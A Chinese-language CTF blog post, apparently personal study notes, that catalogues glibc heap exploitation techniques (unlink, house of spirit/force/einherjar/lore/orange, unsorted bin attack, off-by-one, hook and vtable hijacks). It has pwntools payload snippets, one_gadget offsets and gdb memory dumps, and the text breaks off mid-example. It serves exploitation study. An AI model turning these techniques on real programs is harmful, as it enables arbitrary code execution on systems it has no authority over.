---
layout: post
title: "堆漏洞利用"
date: 2018-06-28 13:17:48 +0800
description: ""
category: ctf/bin
tags: [pwn, heap]
---
## 开启pie保护
- 查找程序中保存已知偏移的函数指针，如sub_B30，通过chunk重叠之类的泄漏方式，打印出函数指针的真实值，减去偏移，即可得code段基地址，通过elf.address设置基地址，余下就是常规操作了。（sample：opm）
  ```py
  #0000000000000B30 show_chunk_B30  proc near  
  code_base = show_chunk_addr-0xb30
  elf.address=code_base #设置基地址
  success('atoi_got: '+hex(elf.got['atoi'])) #基于基地址打印某个函数的got地址值
  ```
- 利用unsortedbin泄漏main_area，从而得到libc_base
- 利用fastbin泄漏chunk，从而得到heap_base

## 仅仅开启partial RELRO，劫持程序流方式
- 已知栈地址，覆盖栈上保存的函数返回地址（不常用）
- 程序中某些字段保存函数指针，直接覆盖（仅用于有函数指针情形，偶尔使用）
- 覆盖某个函数（如free）的got表值（常用）

## 开启了FULL RELRO，无法覆盖GOT表
#### 修改\_\_free_hook或者\_\_malloc_hook（sample：stkof）
1. 直接任意地址覆盖

   ```py
   malloc_hook = libc_base + libc.symbols['__malloc_hook']
   one_gadget = libc_base + 0xf1147 #0xf02a4 also works
   edit(3, p64(malloc_hook))
   edit(0, p64(one_gadget)) # 将malloc_hook改写为one_gadget
   add(0x100, wait=False) #调用malloc即调用malloc_hook即one_gadget来get shell
   ```

2. 借助house_of_spirit

   注意：__malloc_hook刚好处于main_arena-0x10位置，而malloc_hook-(0xb10 - 0xaf5 + 0x8 = 0x23)处一般可以伪造出0x7f的fast chunk用于house_of_spirit：

   ```assembly
   0x7f5090e2daf0 <_IO_wide_data_0+304>:	0x00007f5090e2c260	0x0000000000000000
   0x7f5090e2db00 <__memalign_hook>:	0x00007f5090aeee20	0x00007f5090aeea00
   0x7f5090e2db10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
   0x7f5090e2db20 <main_arena>:	0x0000000000000000	0x0000000000000000
   ```

   将块分配到\_\_malloc_hock前，即可以调用修改chunk功能，将__malloc_hook修改为one_gadget。

```py
payload = 'a' * 0x18 + p64(0x7f) + p64(malloc_hook - 0x23)
add(0xf8, payload) #1
add(0x68, '') #2
payload = '\0' * 0x13 + p64(one_gadget)
add(0x68, payload)
```

覆盖\_\_malloc_hook/\_\_free_hook/main函数返回地址除了可以覆盖为system_addr，还可以借助工具：[one_gadget](https://github.com/david942j/one_gadget)，可以直接调用，而无需传入参数'/bin/sh'，但由于对寄存器或者栈空间有限制，如：[rsp+0x70] == NULL，因此可能需要多试几个：

```sh
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
one_gadget_offset1 = 0x45216
one_gadget_offset2 = 0x4526a
one_gadget_offset3 = 0xf02a4
one_gadget_offset4 = 0xf1147
```
#### libc中有一个全局变量__environ, 储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址（sample：tinypad）
通过本地调试得到libc中environ symbol中存放的地址（环境变量栈地址），记为：stack_env
```py
environ = libc_base + libc.symbols["__environ"]
environ: 0x7f6a7f061f38
stack_env address: 0x7ffce69aa7f8
```
通过本地调试的调用堆栈得到main返回地址的值：
```assembly
─────────────────────────────────[BACKTRACE]────────────────────────────────
f0     7f6a7ed92260 __read_nocancel+7
f1           400ed9 _read_n+112
f2           401100 read_until+73
f3           400832 getcmd+92
f4           4009c1 main+350
f5     7f6a7ecbb830 __libc_start_main+240
```
利用pwndbg查找main返回地址在栈空间的地址：
```sh
pwndbg> search -p 0x7f6a7ecbb830
[stack]         0x7ffce69aa708 0x7f6a7ecbb830
```
计算环境变量栈地址和main函数返回地址的距离：
0x7ffce69aa7f8 - 0x7ffce69aa708 = 0xf0
由于每次运行时，两者距离为定值，因此运行时main函数返回地址可以通过运行时环境变量栈地址减两者距离。得到main返回地址后，将其覆盖为one_gadget即可：
```py
main_ret address: stack_env - 0xf0
edit(p, 2, p64(stack_env-0xf0))
edit(p, 1, p64(one_gadget))
```
#### [伪造vtable劫持程序流程](#glibc223版本利用vtable)

## 堆溢出
- 如果chunk中保存着下一个chunk的指针，将其修改为某个函数的GOT值，再通过show chunk功能泄漏
- 布置当前chunk，并溢出伪造下一个chunk的pre_size和size，free下一个chunk时，引起当前chunk unlink。（sample：stkof）

## UAF(Use After Free)
原理：由于free后原指针没有置为NULL，可以通过原来指针直接访问
- 可以通过show chunk功能泄漏heap addr
- 如果原来某个字段是函数指针，可以直接覆盖为system指针

## House_Of_Spirit
由于_int_malloc 中校验的方法：
```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
}
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```
只取(unsigned int) (sz)，因此size字段只需要保证低32位范围处于0x20-0x80之间的值，高32位不作要求。
可借助pwndbg功能查找fake_fast：
```
pwndbg> find_fake_fast 0x7fd798586b10 0x7f
FAKE CHUNKS
0x7fd798586aed
```
#### 在GOT表附近找错位范围0x20-0x80之间的值（sample：silent）
一般而言，GOT表第一项为：
0x602000: 0x0000**00000060**1e28（address of dynamic)
错位0x602002的低32位为：0x00000060，符合fastbin size范围，因此fake chunk为：0x602002 - 0x8 = 0x601ffa。利用double free fast bin，将第一个chunk的fd设置为fake chunk，当再次malloc时，即分配到fake chunk，一般步骤为：
```py
malloc(0x50)
malloc(0x50)
free(0)
free(1)
free(0)  #fastbin list: 0->1->0
add(0x50, 0x601ffa) #将0的fd设为fake chunk
malloc(0x50) #1
malloc(0x50) #0 由于之前已经将0位置的fd设为fake chunk
malloc(0x50) #此时分配的chunk即为0x601ffa
```
将GOT表作为块分配使用之后：
- 修改free_got为puts_plt即可以泄漏某个note
- 通过show chunk功能泄漏fake chunk（GOT表）
- 通过edit chunk功能将free_got改为system_addr或者system_plt

#### 在\_\_malloc_hook或\_\_free_hook前面找错位范围0x20-0x80之间的值（sample：baby_heap2017）
一般而言，__malloc_hook前（0xb10-0xaf5）处可以错位出0x7f，因此fake chunk = malloc_hook - (0xb10 - 0xaf5 + 0x8)
```assembly
0x7ff583cffaf0 <_IO_wide_data_0+304>: 0x00007ff583cfe260  0x0000000000000000 
0x7ff583cffb00 <__memalign_hook>: 0x00007ff5839c0e20  0x00007ff5839c0a00  
0x7ff583cffb10 <__malloc_hook>:   0x0000000000000000  0x0000000000000000
```
将块分配到\_\_malloc_hock前，即可以调用修改chunk功能，将__malloc_hook修改为one_gadget。

## Unlink（sample：silent2，stkof）
1. 分配两个0x80（设index为：3和4，主要是为了预留出前面0，1，2用于chunklist-0x18），free第一个，再free第二个的时候，会和第一个合并，分配一个0x80*2 + 0x10= 0x110的fake chunk，则返回之前被free的两个chunk，即第一个chunk的地址。
2. 找到chunklist中保存这个chunk的地址一般为：chunklist+0x18，将第一个chunk内容布置为：
   0x0,0x81,chunklist+0x18-0x18,chunklist+0x18-0x10...0x80,0x90
3. 利用之前没有清空的第二个指针将0x80,0x90再次free（需要程序存在UAF漏洞），此时会将fake chunk布置出来的第一个chunk（0x0，0x80）unlink，即将chunklist+0x18位置内容改写为chunklist+0x18-0x18=chunklist
4. 再利用edit chunk(3)功能，将chunklist改写为某个函数（一般为free）的GOT地址
5. 再利用edit chunk(0)功能，将该free_got先修改为puts_plt，将另一个chunk改为puts_got，将puts_got泄漏，然后再将free_got改为system_plt或者system_addr。
根据how2heap，fake chunk的值为0x0, 0x81或者：0x0，0x0均可绕过检查，因为检查：
```c
(chunksize(P) != prevsize (next_chunk(P)) == False
```
当fake chunk的size是0,也就是在去找一个chunk的presize的时候,由于P+size=P+0，实际上找到的是fake chunk自身的presize,由于两个都是0,自然就是相等的，参考：[how2heap总结-上](https://www.anquanke.com/post/id/86808)

附：free进行后向合并合（并低地址的chunk）的代码：
```c
/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = prev_size(p);
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  unlink(av, p, bck, fwd);
}
```

## unsortbin泄漏main_arena
参考：[UAF获取main_arena地址泄露libc基址](https://www.jianshu.com/p/7904d1edc007)
1. 释放时只释放content，不释放header。可以申请一个大content，然后释放，下一个申请header+content=上一个content，即上一个content会被分割，然后通过下一个content泄漏unsortedbin地址（sample：[raisepig](https://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/#pwn-raise-pig)）
   ```py
   add(0x100,'a','0') #4
   add(0x100,'b','1')#5
   free(4)
   add(0xd0,'c','3')  #6 4 -> 0x30 (0x28) header & 0xe0 (0xd0)
   ```
2. fastbin为空时，unsortbin的fd和bk指向top chunk地址
3. 先分配两个fast chunk，再分配一个非fast chunk，按2->1->3顺序释放：
   ```py
   add(0x70)  # idx 1
   add(0x70)  # idx 2
   add(0x100)  # idx 3
   delete(2)  # delete idx 2
   delete(1)  # fastbin: 1->2
   delete(3)
   ```
   会引起chunk 1/2/3均和top chunk合并，chunk1的fd和bk指向top chunk：
   ```assembly
   0x1461000:	0x0000000000000000	0x0000000000021001 <-1
   0x1461010:	0x00007f6abcc3cb78	0x00007f6abcc3cb78
   0x1461080:	0x0000000000000080	0x0000000000000080 <-2
   0x1461090:	0x0000000000000000	0x0000000000000000
   0x1461100:	0x0000000000000000	0x0000000000020f01 <-3
   0x1461210:	0x0000000000000000	0x0000000000020df1 <-old top chunk
   ```

这个top chunk指针保存在main_arena的0x58（88）偏移处，而main_arena保存在libc的data段中，是全局静态变量，所以偏移是固定的。可以通过以下方式泄漏出来：
1. UAF
   ```py
   add(0x80)
   free(0) #此时之前malloc的地址会被写上fd和bk
   show(0) #利用show chunk功能打印出fd（即top chunk地址）
   ```
2. 如果原地址free后被置为NULL，则可以通过fastbin和堆溢出，构造一个fast chunk指向这个small chunk，再通过fast chunk泄漏。（sample：[baby_heap 2017](https://blog.csdn.net/qq_35519254/article/details/78213962)）
   ```py
   alloc(0x20)  #0
   alloc(0x20)  #1
   alloc(0x20)  #2
   alloc(0x20)  #3 
   alloc(0x80)  #4
   free(1)  
   free(2) #fastbin: 2 -> 1
   ```
   通过堆溢出将fastbin的fd修改指向4，这里用到技巧只覆盖低位，这样就无需知道chunk4的完整地址：
   ```py
   payload  = p64(0)*5  + p64(0x31) + p64(0)*5 + p64(0x31) + p8(0xc0)  #fake fastbin: 2 -> 4
   fill(0, payload)
   payload  = p64(0)*5 + p64(0x31)
   fill(3, payload)  #fake size of 4 to 0x31
   alloc(0x20)  #new 1
   alloc(0x20)  #new 2 == 4
   payload  = p64(0)*5 + p64(0x91)
   fill(3, payload) #change size of 4 back to 0x91
   alloc(0x80) #avoid consolidating the top chunk
   free(4)  #free 4 to unsorted bin
   dump(2)  #since 2 == 4, dump 2 means dumping fd of unsorted bin in 4
   ```
3. 如果原地址无法打印，可以通过堆溢出覆盖chunk的bk指向某个可以打印的地址，当malloc掉该chunk时，这个可打印地址的fd会被更新为top chunk（参考how2heap的unsorted_bin_attack）：
   ```py
   p=malloc(0x80)
   malloc(0x80) #防止被合并
   free(p)
   p[1] = (unsigned long)(&target_addr-2);
   malloc(0x80) #target_addr会被写入top chunk指针，将target_addr输出即可
   ```

假如输出的top chunk指针为：0x7f74eb3f3b78 (main_arena+88)，通过IDA打开libc.so寻找malloc_trim函数：
```c
v23 = (volatile signed __int32 *)&dword_3C4B20; //此为main_area在libc中的偏移
```
因此libc_base = 0x7f74eb3f3b78 - 88 - **0x3C4B20**
泄漏libc_base后，可以常规采用覆盖free_got为system_addr的方式，也可以将free_hook或malloc_hook覆盖为system_addr
```py
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
```
将\_\_free_hook的值改写为system_addr，即可以在调用free时调用system，同理\_\_malloc_hook。
## Arbitrary Alloc
观察要控制的__malloc_hook（堆）或者栈上可以错位构造出一个合法的size值的位置，对当前分配的chunk：
```py
free(chunk);
chunk = target_addr; //对fastbin列表的fd赋值
chunk = malloc();
target = malloc();   //此时分配到的即为target_addr
```
## Alloc to Stack
栈中如果伪造fake_chunk，设置好fake_chunk的size和fastbin chunk的size一直，劫持fastbin链表中的fd指向该fake_chunk，即可实现fastbin attack时将空间分配到栈上的这个fake_chunk，此时如果可以读入足够多的字节则可以覆盖到栈上的ret address。
```c
CHUNK stack_chunk;
stack_chunk.size=0x21; //设置fake_chunk的size
void* chunk1=malloc(0x10);
free(chunk1); //fastbin chunk
*(long long *)chunk1=&stack_chunk; //劫持fd指向fake_chunk
malloc(0x10);
void* chunk_a=malloc(0x10); //成功将fake_chunk分配
```
## NULL byte Off_By_One
#### 覆盖已free chunk的size，使得虚假位置的pre_size被更新：
```c
uint8_t* a = malloc(0x100);
uint8_t* b = malloc(0x200);
uint8_t* c = malloc(0x100);
free(b) //c的pre_size会被更新为0x210
a[real_a_size] = 0; //通过NULL byte off_by_one将b的size从0x210改为0x200
(size_t)(b+0x1f0) = 0x200; //伪造prev_size(next_chunk(P))=*(b-0x10+0x200)==size(P)=200
b1 = malloc(0x100); //b1=b，并且由于上一步的伪造，更新pre_size是在b+0x1f0处（被更新为0x200-0x10-0x100=0x90），而不是c的真实pre_size位置
b2 = malloc(0x80); //这个一般就是我们可以利用的地址
```
之后将b1(b)和c依次free，则会导致b开始一直到c末尾的内存合并在一起
```c
free(b);
free(c);
d = malloc(0x300); //d=b1=b，重要的是刚才没有free的b2被包含在了里面！
```
会引起b和c合并的关键一步是在free(b)使得c的pre_size被更新为0x210后，**通过NULL byte off_by_one将伪造next_chunk(P)的pre_size位置设置在b+0x1f0**，使得后面b1和b2的malloc更新pre_size(next_chunk(P))时，更新的位置均在b+0x1f0，而真实的pre_size(c)一直都是0x210。因此当最后free(c)时检查的是c的presize位，会认为前面的0x210都是空闲，于是就错误地将b和c进行了合并，从而实现了b2和d的overlap。
#### House_Of_Einherjar
覆盖当前chunk的pre_inuse标志为零，让free函数以为上一个chunk已经被free，这就要求了当前chunk的size必须要是0x100的倍数，否则需要保证下一个chunk（P+0x100）的size不为0，要不然会check下一个chunk失败，或者和top chunk进行合并操作的时候失败。
```c
a = (uint8_t*) malloc(0x38);
b = (uint8_t*) malloc(0xf8); #b的size为0x101
a[real_a_size] = 0; #通过off_by_one将b的size改为0x100
```
1. 在目标地址伪造fake chunk，保证fake chunk的fd/bk指向自己，同时fd_nextsize=0，以绕过unlink检查：
   ```c
   size_t fake_chunk[6];
   fake_chunk[2] = (size_t) fake_chunk; // fwd
   fake_chunk[3] = (size_t) fake_chunk; // bck
   fake_chunk[4] = (size_t) 0; //fwd_nextsize
   ```
   计算当前chunk到fake chunk之间的距离x，将当前chunk的pre_size和fake chunk的size设置为x
   ```c
   size_t fake_size = (size_t)((b-sizeof(size_t)2) - (uint8_t)fake_chunk);
   (size_t)&a[real_a_size-sizeof(size_t)] = fake_size; //pre_size of b
   fake_chunk[1] = fake_size; //size of fake chunk
   ```
   free当前chunk即可以引起fake chunk和当前chunk和top chunk进行unlink操作，合并成一个top chunk，从而达到将top chunk设置到我们伪造chunk的地址，当再次malloc即可从fake chunk处分配空间
   ```c
   free(b);
   d = malloc(0x200); //d == fake chunk
   ```
   和House_Of_Force一样，利用这种方式可以用malloc返回一个任意地址，即使是heap区域之前的地址（一般可以考虑覆盖栈的ret addr或者free_got）。前提是：
   1. 可以控制目标地址前0x18个字节布置fd/bk/fd_nextsize以绕过unlink检查，除非目标地址刚好有连续两个指针指向自己（现成的fd/bk）。
   2. 知道当前chunk（即heap地址）用于计算相对距离。
2. 类似方法1，在目标地址伪造fake chunk，保证fake chunk的fd/bk指向自己，同时保证fake chunk的size处于small chunk范围，且fakechunk+size处的pre_size==fake chunk的size，即可将unsortedbin伪造到fake chunk（sample：tinypad）
     ```assembly
     0x602060 <tinypad+32>:	0x0000000000000000	0x0000000000000101
     0x602070 <tinypad+48>:	0x0000000000602060	0x0000000000602060
     0x602160 <tinypad+288>:	0x0000000000000100	0x0000000002066140
     0x1bea020(heap): 0x00000000015e7fc0	0x0000000000000100 <-off_by_one
     ```
     free(0x1bea020 + 0x10)即引起fake chunk unlink，并且和当前chunk合并：
     ```assembly
     0x602060 <tinypad+32>:	0x0000000000000000	0x00000000015e80c1 <-和0x1bea020合并
     0x602070 <tinypad+48>:	0x00007fc5d7c9db78	0x00007fc5d7c9db78(main_area+88)
     ```
     对比：方法1直接控制top chunk，因此要求free的chunk必须与top chunk相邻，并且由于fake chunk的size过大，需要覆盖fwd_nextsize为0。而2只控制unsortedbin，因此不要求free的chunk与top chunk相邻，不需要覆盖fwd_nextsize，但是需要保证fakechunk+size处的pre_size==fake chunk的size（即*0x602068 == *0x602160），难度比1更高。
3. 覆盖pre_size为上一个chunk的size：
   ```c
   (size_t)&a[real_a_size-sizeof(size_t)] = 0x40
   ```
   伪造上一个chunk的fd和bk指向自己以绕过unlink检查，由于上一个chunk大小处于small chunk范围，无需伪造fd_nextsize：
   ```c
   (size_t)&a[0] = (size_t) a-0x10; // fwd
   (size_t)&a[1] = (size_t) a-0x10; // bck
   ```
   由于PREV_INUSE位为0，会认为上一个0x40长度的chunk也是free，free当前chunk会引起上一个chunk unlink（触发unlink attack），并且上一个chunk和当前chunk合并，当再次malloc，可以实现overlap：
   ```c
   free(b)
   c = malloc(0x130) //c == a，实现c和a的overlap
   ```

附unlink时检查fd_nextsize代码：
```c
if (!in_smallbin_range (chunksize_nomask (P))                         \
  && __builtin_expect (P->fd_nextsize != NULL, 0)) {                \
    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)        \
      || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
      malloc_printerr ("corrupted double-linked list (not small)");   \
```
## House_Of_Lore（smallbin malloc伪造）
栈上分配两个数组：
```c
intptr_t* stack_buffer_1[4] = {0};  
intptr_t* stack_buffer_2[3] = {0};
```
分配victim chunk，并申请一块大内存，防止free时victim chunk被合并：
```c
victim = malloc(0x80)
void *p5 = malloc(1000);
```
现在把victim chunk给free掉，它会被放入unsortedbin中。放入unsortedbin之后victim chunk的fd和bk会同时指向unsortedbin的头部：
```c
free((void*)victim);
```
再申请一个不能被unsortedbin和smallbin响应的malloc。
```c
void *p2 = malloc(1200);
```
malloc之后victim chunk将会从unsortedbin转移到smallbin中。同时它的fd和bk也会更新，改为指向smallbin的头部。现在假设发生了溢出改写了victim的bk指针：
```c
victim[1] = (intptr_t)stack_buffer_1; // victim->bk point to buffer_1
stack_buffer_1[2] = victim-2; //buffer_1->fd pointing to victim
stack_buffer_1[3] = (intptr_t*)stack_buffer_2; //buffer_1->bk point to buffer_2
stack_buffer_2[2] = (intptr_t*)stack_buffer_1; //buffer_2->fd point to buffer_1
```
因此现在伪造出来的smallbin列表是：buffer_2 -> buffer_1 -> victim，当再次开始malloc small size内存块时：
```c
p3 = malloc(0x80); //p3 = victim
p4 = malloc(0x80); //p4 = buffer_1[2]
```
可以看到stack_buffer_2的bk字段是空着的，那是因为我们这时没有进行信息的泄露，如果泄露出smallbin_head的值并填上去的话，这个链表才算是完整，当然如果没必要的话可以不这样做。尽管之后再针对这个smallbin的malloc会报错。
利用本方法可以通过伪造smallbin，使得下一个chunk分配到目标地址，比如分配到栈上，可以进一步覆盖ret addr。
```c
intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
memcpy((p4+40), &sc, 8);  //直接覆盖ret addr为jackpot，以绕过canary检查
```
但这种利用方式的难点在于：需要目标地址上预先布置好fd指向victim chunk，bk指向下一个chunk，下一个chunk的fd指向目标地址。因此，只有在可以控制目标地址少量（至少0x10个字节，需要控制fd和bk）时方可使用（但如果可以控制0x10个字节，优先考虑house_of_spirit的fastbin伪造，毕竟只需要伪造0x4个字节伪造出size即可，仅当分配大小fastbin无法满足时，方考虑本方法）
## Overlapping_Chunks
1. chunk在被free之后，直接修改size字段，可以将修改后size大小的chunk malloc出来。
   ```c
   p1 = malloc(0x100 - 8);
   p2 = malloc(0x100 - 8);
   p3 = malloc(0x80 - 8);
   free(p2);
   *(p2-1) = 0x181; // we are overwriting the "size" field of chunk p2
   p4 = malloc(0x180 - 8); //p4 = p2，并且包含了p3
   ```
   说明对于unsortedbin，只需要覆盖free chunk的size即可伪造下一次malloc的chunk
2. chunk被free之前，通过修改size，然后free，欺骗free函数去修改了下一个chunk的presize字段来强行“合并”堆块。
   ```c
   p1 = malloc(1000);
   p2 = malloc(1000);
   p3 = malloc(1000);
   p4 = malloc(1000);
   *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //将p2的size伪造成p2和p3长度之和
   free(p2); //p4的pre_size被free修改为：0x7e0，因此堆系统认为此时空闲的空间为p2至p3
   p6 = malloc(2000); //p6 = p2，并且包含了p3
   ```

## House_Of_Force
通过改写top chunk的size来使malloc返回任意地址（top chunk的size系统初始分配为0x21000）
先分配第一个chunk：
```c
intptr_t *p1 = malloc(0x100);
```
现在heap区域就存在了两个chunk一个是p1,一个是top chunk。假设存在堆溢出漏洞可以用一个很大的值来改写top chunk的size，避免等一下申请内存的时候使用mmap来分配：
```c
intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
ptr_top[0] = -1; //改写之后top chunk的size=0xffffffffffffffff
```
现在top chunk变得非常大，我们可以malloc一个在此范围内的任何大小的内存而不用调用mmap。接下来malloc一个chunk，使得这个chunk刚好分配到我们想控制的那块区域为止，然后我们就可以malloc出我们想控制的区域了：
```c
unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
void *new_ptr = malloc(evil_size);
```
比如：我们想要改写的变量位置在0x602060(bss_var)，top chunk 的位置在0x127b528，再算上head的大小，我们将要malloc 0xffffffffff386b28 个字节。而此时top chunk已经处在0x602050了，之后再malloc就会返回一个包含我们想要改写的变量的chunk了：
```c
ctr_chunk = malloc(100); //ctr_chunk == bss_var
```
利用这种方式可以用malloc返回一个任意地址，即使是heap区域之前的地址（一般可以考虑覆盖栈的ret addr或者free_got）。前提是：
1. 需要有堆溢出或者其他方式**可以覆盖top chunk的size**
2. 需要知道当前chunk（即heap地址）用于计算分配相对长度。

## Unsorted_Bin_Attack
- free的chunk**超过fastbin的大小**（64bit最大为malloc(0x78)）时，如果该chunk**不和top chunk相邻**，无论大小，均会先加入到unsortedbin链表表头，即：head -> new -> old
- 在程序malloc时，如果在fastbin，smallbin中找不到对应大小的chunk，就会尝试从unsortedbin链表尾部往回遍历寻找chunk。如果取出来的chunk大小刚好满足，就会直接返回给用户，否则就会把取出的chunk插入到对应的bin中（smallbin或largebin）。可以将unsortedbin理解为一个中转站，chunk只有在第一次不符合的时候才会被分配到对应的bin。
- 由此可见，unsortedbin采用的遍历顺序是FIFO（**只有fastbin是LIFO，其他的bin都是FIFO**），即**插入的时候插入到unsortedbin的头部，取出的时候从链表尾获取**。
```c
a = malloc(0x20)
victim = malloc(0x80)
c = malloc(0x20)
free(victim) //victim的fd，bk均被写入top chunk指针
```
通过溢出a将victim->bk修改为target_addr-0x10，然后再申请一个smallbin的chunk
```c
victim->bk = target_addr-0x10
malloc(0x80)
```
由于所申请的chunk处于smallbin所在的范围，先到smallbin查找，但是由于此时smallbin为空，所以会去unsortedbin中找，发现unsortedbin不空，于是把unsortedbin中的最后一个chunk（victim）从列表中删除，并更新其前后chunk的对应指针
```c
unsorted_chunks(av)->bk = victim->bk = target_addr-0x10
(target_addr-0x10)->fd = *(target_addr-0x10+0x10) = unsorted_chunks(av)
```
可以看出，在将unsortedbin的最后一个chunk拿出来的过程中，victim的fd并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。这里我们可以看到unsortedbin attack确实可以修改任意地址的值，但是所修改成的值unsorted_chunks(av)却不受我们控制，只能确认是一个很大的地址值，因此一般用作：
- 修改循环的次数来使得程序可以执行多次循环。
- 修改libc中的global_max_fast来使得更大的chunk可以被视为fastbin，修改之后就是fastbin attack了。
- 泄漏unsorted_chunks(av)，详见上文[unsortbin泄漏main_arena](#unsortbin泄漏main_arena)

## House_Of_Orange
应用场景：在没有free函数时借助unsortedbin得到一个释放的堆块。

原理：申请当前top chunk尺寸无法满足的大小，使得原来的top chunk被释放并被置入unsortedbin，这样就可以不用free函数的情况下控制unsortedbin。

具体而言，程序开始时即使只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存（默认大小0x21000）分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。我们称这一块连续的内存区域为arena。此外，我们称由主线程申请的内存为main_arena。后续的申请的内存会一直从这个arena中获取，直到空间不足。当arena空间不足时，它可以通过增加brk的方式来增加堆的空间。

程序第一次进行malloc的时候，heap会被分为两块，一块给用户，剩下的那块就是top chunk。其实，所谓的top chunk就是处于当前堆的物理地址最高的chunk。需要注意的是，top chunk的prev_inuse比特位始终为1，否则其前面的chunk就会被合并到top chunk中。后面再申请堆内存的时候，**会依次检查fastbin、smallbin、unsortedbin、largebin是否满足分配要求**，如果都不符合，会试图使用top chunk。当申请分配的大小超过top chunk大小，会执行sysmalloc来向系统申请更多空间。

对于堆来说，有mmap和brk两种分配方式扩展堆（在main_arena中通过sbrk扩展heap，而在thread_arena中通过mmap分配新的heap）
- brk方式主要是由操作系统提供的brk函数，或glibc库提供的sbrk函数，来增加[brk](https://en.wikipedia.org/wiki/Sbrk)(program break location is the address of the first location beyond the current end of the data region)的大小来向操作系统申请内存。初始时，堆的起始地址start_brk以及堆的当前末尾brk指向同一地址。根据是否开启ASLR，两者的具体位置会有所不同
  1. 不开启ASLR保护时，start_brk以及brk会指向data/bss 段的结尾
  2. 开启ASLR保护时，start_brk以及brk也会指向同一位置，只是这个位置是在data/bss段结尾后的随机偏移处
- 通过mmap分配方式来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。
- malloc的size不能大于mmp_.mmap_threshold，默认为128K
- 伪造的原top chunk的size需要满足：

  1. size必须对齐到内存页，现代操作系统以内存页为单位进行内存管理，一般内存页的大小是4k=4×1024=0x1000，因此伪造的size加上当前位置必须对齐到0x1000。比如：当前top chunk是0x602020+0x20fe0=0x623000是对于0x1000（4kb）对齐，因此我们伪造的fake_size可以是0x0fe1、0x1fe1、0x2fe1、0x3fe1等对4kb对齐的size：
     ```assembly
     0x602020:   0x0000000000000000  0x0000000000020fe1
     ```
  2. size要大于MINSIZE(0x10)
  3. size要小于之后申请的chunk size + MINSIZE(0x10)
  4. size的prev inuse位必须为1

首先通过溢出伪造top chunk的size，需要保证伪造的size加上当前位置对齐到0x1000
```c
ptr=malloc(0x10);
ptr=(void *)((int)ptr+24);
((long long)ptr)=0x1fe1; //伪造top chunk的size，需要保证0x1000对齐
```
原来的top chunk：
```assembly
0x602020:   0x0000000000000000  0x0000000000020fe1 <== top chunk
```
被覆盖伪造为：
```assembly
0x602020:   0x0000000000000000  0x0000000000001fe1 <== top chunk
```
此时，再申请**大于伪造size且小于128K**的内存
```c
malloc(0x2000); //0x623010
```
从而引起原来的堆进行brk扩展：
```assembly
//原有的堆
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
//经过扩展的堆
0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]
```
我们的申请被分配到0x623010的位置，同时**引起原来的top chunk执行_int_free被置入unsortedbin**，当再次分配时由于各个bin中均没有适合的chunk，则会从在unsortedbin中的原top chunk中切割：
```c
malloc(0x60); //0x602030
```
切割后的chunk会重新被放回unsortedbin：
```assembly
unsorted_bins[0]: fw=0x602090, bk=0x602090
 →   Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE)
```

## 借助_IO_FILE劫持程序流程
#### glibc2.23版本利用vtable
由于stdio函数会调用vtable中的指针进行相应的操作。伪造vtable劫持程序流程的中心思想就是针对_IO_FILE_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中布置函数指针来实现。分为两种：
- 一种是直接覆盖vtable中的某个函数指针，在目前libc2.23版本下，位于libc数据段的vtable是不可以进行写入的，因此此方法已不可行。stdin/stdout/stderr的vtable指针可写，但原vtable的各项不可被改写。
  ```assembly
  pwndbg> print &IO_2_1_stdin
  $1 = (struct IO_FILE_plus *) 0x7ffff7dd18e0 <IO_2_1_stdin_> #可写
  pwndbg> x/gx 0x7ffff7dd18e0 + 0xd8
  0x7ffff7dd19b8 <IO_2_1_stdin+216>:	0x00007ffff7dd06e0 #不可写
  0x7ffff7bcd000 0x7ffff7dcd000 ---p 200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
  0x7ffff7dcd000 0x7ffff7dd1000 r--p   4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
  0x7ffff7dd1000 0x7ffff7dd3000 rw-p   2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
  ```
- 另一种是覆盖vtable的指针指向我们控制的内存，然后在其中布置函数指针。

  1. 首先需要知道_IO_FILE_plus位于哪里，对于fopen的情况下是位于堆内存，对于stdin\stdout\stderr是位于libc.so中。如果程序中不存在fopen等函数创建的_IO_FILE时，也可以选择stdin\stdout\stderr等位于libc.so中的_IO_FILE，这三个文件流在程序启动时是自动打开的。在libc2.23之前，这些vtable是可以写入并且不存在其他检测的。_
  2. 根据vtable在_IO_FILE_plus的偏移得到vtable的地址，在64位系统下偏移是sizeof(FILE)=216=0xd8。
  3. 根据欲劫持的IO函数会调用vtable中的哪个函数，覆盖或伪造vtable对应项指针，常用：
     ```
     fread: 8 xsgetn, 14 read
     fwrite/printf/puts: 7 xsputn, 3 overflow, 15 write
     fclose: 17 close, 2 finish
     ```
  4. 由于vtable这些函数指针第一个参数一般为FILE*，因此可以通过覆盖FILE*的值为"/bin/sh"或"sh"向劫持函数传参，或者直接覆盖为one_gadget
  ```c
  fp=fopen("123.txt","rw");
